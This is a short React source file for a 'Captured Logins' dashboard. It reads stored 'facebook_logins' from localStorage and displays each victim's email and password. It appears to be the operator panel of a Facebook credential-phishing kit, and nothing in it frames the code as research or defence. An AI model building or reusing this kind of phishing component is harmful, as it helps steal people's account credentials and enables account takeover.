import React from "react";

function Dashboard() {
  const logins = JSON.parse(localStorage.getItem("facebook_logins")) || [];

  return (
    <div className="login-page">
      <div className="login-card">
        <h2>Captured Logins</h2>
        {logins.length === 0 ? (
          <p>No logins captured yet.</p>
        ) : (
          <ul>
            {logins.map((item, i) => (
              <li key={i}>
                <strong>Email:</strong> {item.email} <br />
                <strong>Password:</strong> {item.password}
              </li>
            ))}
          </ul>
        )}
      </div>
    </div>
  );
}

export default Dashboard;
